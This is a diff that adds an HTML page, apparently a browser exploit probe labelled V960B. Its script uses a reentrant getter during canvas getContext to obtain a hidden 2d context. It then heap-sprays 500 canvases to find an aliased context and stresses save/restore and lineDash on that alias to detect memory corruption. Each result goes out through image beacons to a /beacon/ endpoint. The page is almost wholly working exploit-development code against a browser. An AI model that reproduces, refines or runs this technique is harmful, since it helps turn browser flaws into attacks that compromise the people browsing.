@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V960B</title></head>
+<body><pre id="out">V960B — alias save/restore stack × lineDash oracle (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+var al=null;
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V960B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
+window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); };
+function mkDash(n,base){ var a=[]; for(var i=0;i<n;i++) a.push(base+i+0.25); return a; }
+function sig(arr){ if(!arr||!arr.length) return 'len0'; return 'len'+arr.length+'|v0='+arr[0]+'|t='+arr[arr.length-1]; }
+function snap(stage,expSig){
+  try{
+    var ld=al.getLineDash();
+    var got=sig(ld);
+    var m=(expSig==null)?'-':(got===expSig?1:0);
+    bk(stage,'got='+got+(expSig!=null?'|exp='+expSig+'|m='+m:'')+'|off='+('lineDashOffset' in al?al.lineDashOffset:'na'));
+    return m;
+  }catch(e){ bk(stage+'-EX',String(e&&e.name)+':'+String(e&&e.message||e).slice(0,140)); return -1; }
+}
+async function establishAlias(){
+  bk('BOOT','single-run save/restore-stack × lineDash on live alias; run='+RUN+'; mismatch/crash=signal');
+  var inner=null;
+  var c=document.createElement('canvas'); c.width=64; c.height=64;
+  var settings={};
+  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
+  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
+  if(!inner){ bk('NO-INNER',''); return false; }
+  bk('INNER','ok');
+  var spray=[];
+  for(var i=0;i<500;i++){ var c2=document.createElement('canvas'); c2.width=64; c2.height=64; var g=c2.getContext('2d'); g.lineWidth=1000+i; spray.push({c:c2,g:g}); }
+  bk('SPRAY','500');
+  var found=-1;
+  try{ inner.lineWidth=9999.99; }catch(e){ bk('W1-ERR',String(e)); return false; }
+  for(var i=0;i<spray.length;i++){ try{ if(Math.abs(spray[i].g.lineWidth-9999.99)<0.01){ found=i; al=spray[i].g; break; } }catch(e){} }
+  bk('ALIAS', found>=0?('idx='+found):'MISS');
+  return found>=0;
+}
+(async function(){
+  if(!(await establishAlias())){ bk('DONE','no-alias/stop'); say('no alias'); return; }
+  // baseline
+  bk('S0-PRE','set [1,2]');
+  al.setLineDash([1,2]); snap('S0-OK','len2|v0=1|t=2');
+  var base='len2|v0=1|t=2';
+  // A: save -> big -> restore
+  bk('A-PRE','save,big300,restore');
+  al.save();
+  al.setLineDash(mkDash(300,10)); snap('A-big','len300|v0=10.25|t=309.25');
+  al.restore(); snap('A-rest',base);
+  // B: nested 3 deep LIFO
+  bk('B-PRE','nested3');
+  al.save(); al.setLineDash([3,4]);
+  al.save(); al.setLineDash(mkDash(128,1));
+  al.save(); al.setLineDash([9]);
+  snap('B-d3','len1|v0=9|t=9');
+  al.restore(); snap('B-r3','len128|v0=1.25|t=128.25');
+  al.restore(); snap('B-r2','len2|v0=3|t=4');
+  al.restore(); snap('B-r1',base);
+  // C: rapid cycles
+  bk('C-PRE','50 cycles');
+  var ok=0;
+  for(var i=0;i<50;i++){
+    al.save();
+    if(i%3===0) al.setLineDash(mkDash(64,i));
+    else if(i%3===1) al.setLineDash([]);
+    else al.setLineDash([i+0.5,i+1.5]);
+    al.restore();
+    try{ if(sig(al.getLineDash())===base) ok++; }catch(e){ bk('C-EX','i='+i+':'+e); }
+  }
+  bk('C-OK','ok='+ok+'/50');
+  snap('C-snap',base);
+  // D: empty and odd patterns
+  bk('D-PRE','empty/odd');
+  al.save(); al.setLineDash([]); al.restore(); snap('D1',base);
+  al.save(); al.setLineDash([7,8,9]); al.restore(); snap('D2',base);
+  al.save(); al.setLineDash(mkDash(512,2)); al.save(); al.setLineDash([5,5]); al.restore(); al.restore(); snap('D3',base);
+  bk('DONE','savestack×lineDash complete; any m=0 or EX/crash = corruption signal');
+  say('done run='+RUN);
+})();
+</script>
+</body></html>
